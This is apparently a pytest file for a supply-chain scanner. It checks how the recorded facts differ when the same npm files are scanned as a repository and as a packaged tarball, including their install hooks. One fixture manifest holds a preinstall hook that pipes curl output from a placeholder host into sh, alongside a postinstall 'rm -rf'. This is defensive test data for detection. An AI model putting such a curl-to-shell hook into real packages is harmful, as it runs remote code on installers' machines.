"""The same files give different facts as a repository and as a published package, and the record says which it was.

A directory is read as source: its manifest's entries are declared and no import graph of a published package exists. A package archive is read as it is installed and imported, so the same file is placed by an
import entry or a library entry. The facts record carries the distribution kind (`target_kind`), the place sets and the way each file is reached, and the terms the rules read are taken from them, so a rule
that asks for an import entry is true of the package and not of the repository.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path
from typing import Any, ClassVar

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.report.facts import ScanFacts
from cordon_scanner.rules.fact_terms import FactTerms

FILES = {
    "package.json": json.dumps(
        {
            "name": "p",
            "version": "1.0.0",
            "main": "index.js",
            "scripts": {"postinstall": "node setup.js"},
        }
    ),
    "index.js": "const cp = require('child_process');\ncp.exec('ls');\n",
    "setup.js": "const https = require('https');\nhttps.get('https://example.invalid/x');\n",
}


class Kinds:
    @staticmethod
    def directory_of(root: Path, files: dict[str, str]) -> Path:
        target = root / "repository"
        for name, text in files.items():
            (target / name).parent.mkdir(parents=True, exist_ok=True)
            (target / name).write_text(text, encoding="utf-8")
        return target

    @staticmethod
    def package_of(root: Path, files: dict[str, str]) -> Path:
        target = root / "p-1.0.0.tgz"
        with tarfile.open(target, "w:gz") as archive:
            for name, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(f"package/{name}")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return target

    @staticmethod
    def as_directory(root: Path) -> Path:
        return Kinds.directory_of(root, FILES)

    @staticmethod
    def as_package(root: Path) -> Path:
        return Kinds.package_of(root, FILES)

    @staticmethod
    def facts(target: Path) -> dict[str, Any]:
        return ScanFacts.of(Scanner(Config.default().with_overrides(use_cache=False)).scan(target))


class TestTheSameFilesAsARepositoryAndAsAPackage:
    def test_the_record_says_which_distribution_it_was(self, tmp_path: Path) -> None:
        assert Kinds.facts(Kinds.as_directory(tmp_path))["target_kind"] == "source"
        assert Kinds.facts(Kinds.as_package(tmp_path))["target_kind"] == "package"

    def test_the_place_sets_differ_and_only_the_package_has_the_import_and_library_entries(
        self, tmp_path: Path
    ) -> None:
        repository = Kinds.facts(Kinds.as_directory(tmp_path))["package"]["places"]
        package = Kinds.facts(Kinds.as_package(tmp_path))["package"]["places"]
        assert repository != package
        assert not {"import_entry", "library_entry"} & set(repository)
        assert {"import_entry", "library_entry"} <= set(package)

    def test_the_same_manifest_entry_is_declared_in_the_repository_and_placed_in_the_package(
        self, tmp_path: Path
    ) -> None:
        repository = Kinds.facts(Kinds.as_directory(tmp_path))["package"]["reach"]
        package = Kinds.facts(Kinds.as_package(tmp_path))["package"]["reach"]
        assert repository.get("declared_entry") == 1 and "declared_entry" not in package
        assert package.get("placed") == 2

    def test_a_term_that_asks_for_an_import_entry_is_true_of_the_package_only(
        self, tmp_path: Path
    ) -> None:
        repository = FactTerms.of_facts(Kinds.facts(Kinds.as_directory(tmp_path)))
        package = FactTerms.of_facts(Kinds.facts(Kinds.as_package(tmp_path)))
        asking = {
            term
            for term in package
            if len(term) > 2 and term[0] == "file" and term[1] == "import_entry"
        }
        assert asking and not asking & repository
        assert repository != package

    def test_the_same_scan_twice_gives_the_same_kind_facts(self, tmp_path: Path) -> None:
        one, two = Kinds.facts(Kinds.as_package(tmp_path)), Kinds.facts(Kinds.as_package(tmp_path))
        assert (one["target_kind"], one["package"]["places"]) == (
            two["target_kind"],
            two["package"]["places"],
        )


class TestInstallHooksAreInTheRecordForEveryKind:
    """What a package runs when it is installed is the strongest signal the record holds: a published package carries its hooks and their programs exactly as the same files do as a directory."""

    HOOKED: ClassVar[dict[str, str]] = {
        "package.json": json.dumps(
            {
                "name": "p",
                "version": "1.0.0",
                "main": "index.js",
                "scripts": {
                    "preinstall": "curl -s https://example.invalid/a | sh",
                    "postinstall": "node setup.js && rm -rf cache",
                },
            }
        ),
        "index.js": "module.exports = 1;\n",
        "setup.js": "console.log('setup');\n",
    }

    @classmethod
    def hooks(cls, make: Any, tmp_path: Path) -> list[dict[str, Any]]:
        return Kinds.facts(make(tmp_path, cls.HOOKED))["package"]["hooks"]

    def test_the_same_manifest_gives_the_same_hooks_as_a_directory_and_as_a_package(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / "d").mkdir()
        (tmp_path / "p").mkdir()
        directory = self.hooks(Kinds.directory_of, tmp_path / "d")
        package = self.hooks(Kinds.package_of, tmp_path / "p")
        assert directory and directory == package

    def test_each_hook_names_its_kind_and_the_programs_it_runs(self, tmp_path: Path) -> None:
        package = self.hooks(Kinds.package_of, tmp_path)
        assert {"kind": "postinstall", "programs": ["node", "rm"]} in package
        assert {"kind": "preinstall", "programs": ["curl", "sh"]} in package

    def test_a_package_without_hooks_has_none(self, tmp_path: Path) -> None:
        plain = {
            "package.json": json.dumps({"name": "p", "version": "1.0.0"}),
            "index.js": "module.exports = 1;\n",
        }
        assert Kinds.facts(Kinds.package_of(tmp_path, plain))["package"]["hooks"] == []

    def test_a_hook_of_a_dependency_a_package_vendors_is_not_the_packages_own(
        self, tmp_path: Path
    ) -> None:
        files = {
            **self.HOOKED,
            "node_modules/dep/package.json": json.dumps(
                {"name": "dep", "version": "1.0.0", "scripts": {"postinstall": "node dep.js"}}
            ),
            "node_modules/dep/dep.js": "module.exports = 1;\n",
        }
        (tmp_path / "d").mkdir()
        (tmp_path / "p").mkdir()
        directory = Kinds.facts(Kinds.directory_of(tmp_path / "d", files))["package"]["hooks"]
        package = Kinds.facts(Kinds.package_of(tmp_path / "p", files))["package"]["hooks"]
        assert directory == package
